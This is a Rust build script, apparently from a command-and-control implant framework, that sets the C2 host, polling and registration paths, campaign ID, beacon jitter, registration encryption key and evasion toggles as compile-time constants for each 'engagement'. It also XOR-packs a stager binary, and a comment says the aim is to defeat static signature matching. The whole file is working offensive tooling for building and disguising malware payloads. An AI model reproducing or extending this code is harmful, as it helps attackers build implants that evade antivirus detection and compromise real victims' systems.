// Build script — reads build-service-injected environment variables
// and emits them as compile-time constants accessible via env!() macros.
//
// The build service sets these when compiling a payload for a specific engagement.
// Defaults here are for local development only; never ship a payload with defaults.

fn main() {
    let vars = [
        ("DM_C2_HOST",       "127.0.0.1"),
        ("DM_C2_PORT",       "4443"),
        ("DM_C2_PATH_POLL",  "/c"),
        ("DM_C2_PATH_REG",   "/r"),
        ("DM_CAMPAIGN_ID",   "00000000-0000-0000-0000-000000000000"),
        ("DM_BUILD_UUID",    "00000000-0000-0000-0000-000000000000"),
        ("DM_SLEEP_SECS",    "30"),
        ("DM_JITTER_PCT",    "20"),
        // AES-256 key for encrypting the registration payload (hex-encoded)
        ("DM_REG_KEY",       "0000000000000000000000000000000000000000000000000000000000000000"),
        // Set to "true" in dev to skip TLS cert verification (self-signed certs)
        ("DM_TLS_SKIP_VERIFY", "false"),
        // Set to "true" in dev to disable all evasion/sandbox checks
        ("DM_NO_EVASION", "false"),
    ];

    for (key, default_val) in vars {
        let val = std::env::var(key).unwrap_or_else(|_| default_val.to_string());
        println!("cargo:rerun-if-env-changed={key}");
        println!("cargo:rustc-env={key}={val}");
    }

    // ── Packer stub support ───────────────────────────────────────────────────
    // When DM_STAGER_PATH is set, XOR-encrypt the stager binary and write the
    // result to OUT_DIR/packed_stager.bin so dm-stub can embed it at compile time.
    // Format: [key: 4 bytes LE] || [XOR-encrypted stager bytes]
    // When DM_STAGER_PATH is not set, write a 4-byte placeholder so dm-stub
    // compiles (with a no-op payload) without requiring the env var.
    println!("cargo:rerun-if-env-changed=DM_STAGER_PATH");
    let out_dir = std::env::var("OUT_DIR").unwrap();
    let packed_path = format!("{out_dir}/packed_stager.bin");

    match std::env::var("DM_STAGER_PATH").ok().filter(|s| !s.is_empty()) {
        Some(stager_path) => {
            println!("cargo:rerun-if-changed={stager_path}");
            let data = std::fs::read(&stager_path)
                .unwrap_or_else(|e| panic!("DM_STAGER_PATH: cannot read '{stager_path}': {e}"));
            // Derive a 4-byte key from the file size and first bytes — deterministic
            // per-stager, different enough to defeat static signature matching.
            let seed = data.len() as u32
                ^ (data.first().copied().unwrap_or(0) as u32)
                ^ (data.last().copied().unwrap_or(0) as u32).rotate_left(8);
            let key: [u8; 4] = [
                (seed >> 24) as u8,
                (seed >> 16) as u8 ^ 0xA3,
                (seed >>  8) as u8 ^ 0x7F,
                (seed      ) as u8 ^ 0x5C,
            ];
            let mut packed = Vec::with_capacity(4 + data.len());
            packed.extend_from_slice(&key);
            packed.extend(data.iter().enumerate().map(|(i, &b)| b ^ key[i % 4]));
            std::fs::write(&packed_path, &packed)
                .unwrap_or_else(|e| panic!("failed to write packed stager: {e}"));
        }
        None => {
            // No stager to pack — write a 4-zero-byte placeholder so dm-stub
            // compiles but exits immediately at runtime (payload too short).
            if !std::path::Path::new(&packed_path).exists() {
                std::fs::write(&packed_path, [0u8; 4]).ok();
            }
        }
    }

    println!("cargo:rustc-env=DM_PACKED_PAYLOAD={packed_path}");
}
